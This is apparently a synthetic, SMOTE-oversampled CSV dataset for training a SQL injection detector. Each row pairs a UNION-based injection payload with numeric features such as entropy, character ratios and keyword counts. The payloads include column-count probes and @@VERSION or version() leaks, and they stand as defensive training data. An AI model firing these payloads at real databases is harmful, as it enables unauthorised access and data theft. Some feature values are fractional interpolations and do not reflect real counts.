id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000269,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000273,0.05371785334220704,59.71554272047074,15.0,3.0418314900494723,45.772434176376585,1.0,4.0,8.943108544094146,0.7664942683154368,0.01675286584228161,0.06701146336912638,0.1497414024731552,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.943108544094146,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000270,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000639,0.8928055131231296,68.05539999375264,21.0,3.5014770669683077,14.0,32.0,10.618914280359409,11.436485713393235,0.20624452993321862,0.47141606841878536,0.15422782655413259,0.16811157509386349,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.4364857133932347,1.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000271,attack,union,"1%"" union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000690,0.44233093135136553,64.3846674332261,16.0,3.119730985362322,47.907733946580876,1.0,4.0,11.47693348664522,0.7438586027687307,0.015594832564241434,0.062379330256965876,0.17816723441006196,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,7.476933486645221,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R000473,0.22605581545214082,63.4643698829976,25.642913255331734,4.051373527492978,32.642913255331734,9.0,15.642913255331734,6.178543372334133,0.5142987300723131,0.14185980303612233,0.24634132433741532,0.09750014255414931,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.1785433723341328,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000273,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000077,0.3039770333424836,76.0,33.5422543572315,4.454262953605606,42.0,3.0,17.0,14.0,0.5526315789473685,0.039473684210526355,0.2236842105263158,0.18421052631578946,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.4577456427685,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000274,attack,union,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",nearest_attack_euclidean,R000218,0.588555894862672,62.07628973830684,19.38474205233863,3.769170371449154,14.0,34.46103179064547,4.0,9.615257947661368,0.22670890288963502,0.5538589054341105,0.06477397225418144,0.154658219422073,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.615257947661368,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000275,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000271,0.06292642775519519,73.6710203104054,21.0,3.5093441558673204,14.0,39.73681624832432,8.0,11.93420406208108,0.19009120948968358,0.539303484128434,0.1086235482798192,0.16198175810206328,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.934204062081079,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,union,"1""  )   where 2633  =  2633 union all select null,null,null,null#",nearest_attack_euclidean,R000297,0.0636681283117325,65.30978743399179,23.154893716995893,3.8275136286385787,35.232340575493836,9.0,14.077446858497947,7.0,0.5393592365052449,0.13787395428747606,0.21553151142813098,0.10723529777914806,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000277,attack,union,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",nearest_attack_euclidean,R000352,0.8697174941272076,76.51667492100889,23.303334984201776,3.7769886965973667,40.303334984201776,9.0,19.213339936807103,8.0,0.5280505583883532,0.11809820101980714,0.2488750619075666,0.10497617868427303,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.6516674921008878,0.0,0.0,3.348332507899112,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000278,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000425,0.08118495381924462,77.62097494572104,21.031585421189913,3.6720959001064672,14.0,35.87365831524035,13.810487472860526,13.936829157620174,0.18051793915305075,0.46227471844265533,0.17764653722669507,0.17956080517759887,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.9684145788100875,1.0,0.0,6.968414578810087,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000279,attack,union," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",nearest_attack_euclidean,R000084,0.24073498896464549,75.35423368746311,25.0,3.7962372532802635,40.354233687463115,3.354233687463113,24.0,7.645766312536886,0.5355084524668787,0.04447453078900776,0.3185084897369974,0.10150852700711606,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000280,attack,union,"-1170' union all select 4663,4663,4663,4663,4663,4663,4663,4663#",nearest_attack_euclidean,R000439,0.009147047731632175,63.95209005153499,21.0,3.6506899313974763,14.0,35.96167204122799,4.0,9.990418010306998,0.21892763222418174,0.5623071421566027,0.06255075206405192,0.15621447355516366,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.990418010306998,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000462,0.39652868827115734,68.15027715054967,15.0,3.0031145922808986,51.72022172043974,1.0,4.0,11.430055430109935,0.7585565332046125,0.014801238141209871,0.059204952564839375,0.16743727608933834,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.430055430109935,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000667,0.30893074503209406,61.416462311540144,24.71670753769197,4.150391027415747,27.0,17.133169849232115,11.0,6.283292462308029,0.44019372245856825,0.27828892153058576,0.17933818322386114,0.10217917278698485,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.2832924623080286,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000270,0.2879292906329449,78.5431887184669,15.0,3.0513775027589753,51.23455097477351,1.0,14.0,12.308637743693378,0.6521857759160937,0.012742605524474676,0.1783964773426455,0.1566751412167861,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,8.308637743693378,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000370,0.8190562105915236,76.8766713392352,16.0,3.091502025209228,52.2466573215296,1.0,10.630014017705609,13.0,0.680061690977994,0.013010008208631019,0.1377981941011715,0.1691301067122035,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.4383356696176015,0.0,0.0,8.5616643303824,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000285,attack,union,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000243,0.44521713824265147,75.52456042555906,23.71315936166141,3.8276737689493077,42.52456042555906,9.0,14.47543957444094,9.52456042555906,0.5629997322267868,0.1191818912108763,0.19181891210876326,0.1259994644535736,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.52456042555906,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000286,attack,union,"-2787'   )    )    union all select 1996,1996,1996,1996,1996,1996,1996,1996#",nearest_attack_euclidean,R000771,0.4476263402436536,78.10076700888257,22.420153401776513,3.719041008544038,14.0,37.680613607106054,14.0,12.420153401776513,0.17943295352105978,0.4821473394769798,0.17943295352105978,0.1589867534809006,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.420153401776513,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union,"-7347""   )    )    union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#",nearest_attack_euclidean,R000493,0.9614886212015828,78.66192653059653,20.532385306119306,3.5958420112920506,14.0,36.259082448954445,15.870458775522781,12.532385306119306,0.17815676227609628,0.45979672143298383,0.20276806195402758,0.15927845433689228,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.4676146938806953,0.0,0.0,7.064770612238609,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000288,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000373,0.26771004263620496,78.93725846262623,24.425096614949506,3.840341968873245,19.0,35.14980677010098,14.0,10.787451692525247,0.2408653482016836,0.44504053949225575,0.17747973025387212,0.13661438205218854,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.787451692525246,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000289,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000237,0.3390469767731912,65.41566940629129,20.316866118741743,3.6684658926043427,14.0,22.732535525033036,18.0,10.683133881258259,0.21429480700816608,0.34691955089702026,0.27552189472478494,0.16326374737002866,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,3.6831338812582586,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,union,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",nearest_attack_euclidean,R000174,0.23863787467668776,80.1993917133406,22.8006082866594,3.7556797343991435,14.0,43.60121657331881,8.598175140021795,14.0,0.17457446890445605,0.5437994040363595,0.10705165815472846,0.17457446890445605,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0996958566702988,1.0,0.0,8.900304143329702,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,union,"1  )   where 9371  =  9371 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000530,1.0314404034261295,78.32221757500477,22.419445606248804,3.7114207175995744,45.32221757500478,9.0,14.0,10.0,0.5783936151274931,0.1149835595106837,0.17886331479439688,0.12775951056742635,0.41944560624880534,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.5805543937511946,3.0,0.41944560624880534,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000292,attack,union,"1   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000375,0.21489035561148312,66.6814268549031,15.0,3.088081816253929,42.0,1.0,14.545141483922478,9.13628537098062,0.6302560973312142,0.015006097555505082,0.2177634148464021,0.13697439026687858,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1362853709806195,0.0,0.0,6.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,union,"1%'   )    )     )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000660,0.4674484708816787,60.616926044639214,17.0,3.2355830545225444,32.09354083571137,1.0,18.0,9.523385208927843,0.5289867507203293,0.016525198126809193,0.2974535662825654,0.1570344848702961,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,3.5233852089278432,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000294,attack,union," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.3472987468357937,81.31932470672298,27.680675293277016,3.9533383148043835,40.0,4.0,24.638649413445968,12.680675293277016,0.49190409691825965,0.04919040969182595,0.3029308656320041,0.1559746277579102,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.680675293277017,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000295,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000429,0.11069102240538828,60.52112749393682,19.104225498787365,3.6166713114655944,14.0,32.41690199514945,4.0,10.104225498787363,0.2314626192525345,0.5354712922828178,0.06613217692929556,0.1669339115353522,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.104225498787364,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,union,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",nearest_attack_euclidean,R000211,0.3801055606151139,75.0,21.171860460818692,3.6684752405785925,14.0,44.0,4.0,13.0,0.1866666666666667,0.5866666666666667,0.053333333333333344,0.17333333333333334,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000297,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000313,0.23893251069165447,69.25588128625728,16.0,3.1747423196107016,39.00470502900582,1.0,18.0,11.251176257251455,0.5629726940158379,0.014452884511229391,0.26015192120212915,0.16242250027080357,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.251176257251454,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.45114214931517194,73.42790942627266,17.0,3.119314589756481,51.94232754101813,1.0,8.0,12.485581885254533,0.7072849859337758,0.01363456089209178,0.10907648713673437,0.17000396603739804,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,8.485581885254533,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000270,0.7590189200252472,74.33651323121607,15.0,3.057270316507168,50.0,1.0,11.717011341042348,11.619501890173725,0.6740583188198881,0.013481166376397763,0.15612220557017362,0.1563383092335406,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.6195018901737248,0.0,0.0,8.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000300,attack,union,"-2582'+  (  select ggim where 5346  =  5346 union all select 5346,5346#",nearest_attack_euclidean,R000559,1.2086069613663957,69.03158538289291,26.53948172861614,4.118808899179251,32.93682923421418,14.586859802955503,15.0,6.507896345723228,0.4792093545354872,0.2091728691090987,0.21747450478381466,0.09414327157159949,1.0,0.0,0.5078963457232275,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0000000000000004,2.5078963457232275,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000301,attack,union,"1'  )   where 5276  =  5276 union all select null,null--",nearest_attack_euclidean,R000635,0.20630865033787654,56.52012358196047,24.173374527320156,3.961566186792927,27.346749054640313,9.0,14.346749054640313,5.826625472679844,0.48376955518974724,0.159297484189575,0.2536731891381389,0.10325977148253886,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.8266254726798432,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000302,attack,union,"1  )   as zdym where 1578  =  1578 union all select null,null,null#",nearest_attack_euclidean,R000575,0.016781122302992967,66.9253290173776,25.970131606951043,4.021891557922265,36.940263213902085,9.0,16.0,4.985065803475522,0.5519404096505702,0.13449013934607643,0.23909358105969142,0.07447586994366198,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.9850658034755222,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
